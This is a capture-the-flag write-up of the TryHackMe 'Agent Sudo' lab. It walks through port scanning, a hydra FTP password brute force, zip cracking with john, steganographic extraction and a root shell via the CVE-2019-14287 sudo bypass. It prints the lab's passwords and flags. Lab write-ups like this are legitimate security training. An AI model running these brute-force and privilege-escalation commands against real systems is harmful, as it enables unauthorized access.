**Tristan Gomez**

```
$ sudo nmap -sS 10.10.141.49
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 14:49 PDT
Nmap scan report for 10.10.141.49
Host is up (0.19s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
```


changed user-agent to `C`
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

` hydra -l chris -P xato-net-10-million-passwords-10000.txt ftp://10.10.141.49`
`[21][ftp] host: 10.10.141.49   login: chris   password: crystal`

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

```

```
$ binwalk --extract *.png                                                                                        

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

```

```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/Desktop/AgentSudo]
└─$ cd *.extracted

┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/Desktop/AgentSudo/_cutie.png.extracted]
└─$ ls                                                                                                             
365  365.zlib  8702.zip  To_agentR.txt

```

```
zip2john 8702.zip > output.txt                                                                                 
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

```

`sudo john output.txt `
```
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
```

```
└─$ 7z e 8702.zip                                                                                                  

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,16 CPUs Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz (A0655),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 05:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 05:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280

```

```
─$ cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

```

cyberchef

`QXJlYTUx` == `Area51`

steghide extract the .jpg file to get `message.txt`

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

login as `james1

```
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

```
cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

cve-2019-14287
```
james@agent-sudo:/$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:/# 

```


```
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

```
